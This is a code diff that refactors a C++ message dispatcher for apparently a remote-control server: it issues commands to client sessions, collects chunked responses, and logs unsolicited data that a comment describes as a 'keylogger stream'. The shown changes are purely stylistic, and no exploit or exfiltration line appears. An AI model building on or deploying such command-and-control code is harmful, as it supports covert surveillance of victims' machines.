@@ -46,16 +46,18 @@ void Dispatcher::onRegister(ClientSession& client,
 
 // A RESPONSE carries the same id as the COMMAND it answers,
 // plus chunk metadata for large payloads split across messages.
-void Dispatcher::onResponse(ClientSession& client, const std::vector<std::uint8_t>& payload) {
-  const auto rsp = ProtocolParser::parseResponsePayload(payload);
-  std::cout << "[← RESPONSE] id=" << rsp.id
-            << "  chunk=" << static_cast<int>(rsp.chunk_index) + 1 << "/"
-            << static_cast<int>(rsp.total_chunks)
-            << "  status=" << static_cast<int>(rsp.status) << "\n"
-            << rsp.data << "\n";
+void Dispatcher::onResponse(ClientSession& client,
+                            const std::vector<std::uint8_t>& payload) {
+  const ResponsePayload response =
+      ProtocolParser::parseResponsePayload(payload);
+  std::cout << "[← RESPONSE] id=" << response.id
+            << "  chunk=" << static_cast<int>(response.chunk_index) + 1 << "/"
+            << static_cast<int>(response.total_chunks)
+            << "  status=" << static_cast<int>(response.status) << "\n"
+            << response.data << "\n";
 
   // Only act once all chunks of this response have arrived.
-  const bool lastChunk = rsp.chunk_index + 1 == rsp.total_chunks;
+  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
   if (lastChunk) sendDisconnect(client);
   // → To send more commands, push them here instead of disconnecting.
 }
@@ -64,36 +66,40 @@ void Dispatcher::onResponse(ClientSession& client, const std::vector<std::uint8_
 // (e.g. keylogger stream). Handle them independently of the
 // request/response cycle.
 void Dispatcher::onData(const std::vector<std::uint8_t>& payload) {
-  const auto data = ProtocolParser::parseDataPayload(payload);
+  const DataPayload data = ProtocolParser::parseDataPayload(payload);
   std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
             << data.data << "\n";
 }
 
 void Dispatcher::onError(const std::vector<std::uint8_t>& payload) {
-  const auto err = ProtocolParser::parseErrorPayload(payload);
-  std::cerr << "[← ERROR] code=" << static_cast<int>(err.code)
-            << "  msg=" << err.message << "\n";
+  const ErrorPayload error = ProtocolParser::parseErrorPayload(payload);
+  std::cerr << "[← ERROR] code=" << static_cast<int>(error.code)
+            << "  msg=" << error.message << "\n";
   //   running = false;
 }
 
 // ── Outgoing senders ─────────────────────────────────────────
 
-void Dispatcher::sendCommand(ClientSession& client, CommandType type, const std::string& data) {
-  CommandPayload cmd;
-  cmd.id = nextId();
-  cmd.type = type;
-  cmd.data = data;
-  const auto payload = ProtocolSerializer::serializeCommandPayload(cmd);
+void Dispatcher::sendCommand(ClientSession& client, CommandType type,
+                             const std::string& data) {
+  CommandPayload command;
+  command.id = nextId();
+  command.type = type;
+  command.data = data;
+  const std::vector<std::uint8_t> payload =
+      ProtocolSerializer::serializeCommandPayload(command);
   sendRaw(client, MessageType::COMMAND, payload);
-  std::cout << "[→ COMMAND] id=" << cmd.id
-            << "  type=" << static_cast<int>(cmd.type) << "\n";
+  std::cout << "[→ COMMAND] id=" << command.id
+            << "  type=" << static_cast<int>(command.type) << "\n";
 }
 
-void Dispatcher::sendError(ClientSession& client, ErrorType code, const std::string& msg) {
-  ErrorPayload err;
-  err.code = code;
-  err.message = msg;
-  const auto payload = ProtocolSerializer::serializeErrorPayload(err);
+void Dispatcher::sendError(ClientSession& client, ErrorType code,
+                           const std::string& msg) {
+  ErrorPayload error;
+  error.code = code;
+  error.message = msg;
+  const std::vector<std::uint8_t> payload =
+      ProtocolSerializer::serializeErrorPayload(error);
   sendRaw(client, MessageType::ERROR, payload);
 }
 
@@ -114,7 +120,8 @@ void Dispatcher::sendRaw(ClientSession& client, MessageType type,
                     type,
                     static_cast<std::uint16_t>(payload.size())};
 
-  const auto headerBytes = ProtocolSerializer::serializeHeader(header);
+  const std::vector<std::uint8_t> headerBytes =
+      ProtocolSerializer::serializeHeader(header);
   const std::size_t expectedHeaderBytes = headerBytes.size();
   const SocketResult headerResult = client.socket->send(headerBytes);
   if (!headerResult.ok() ||
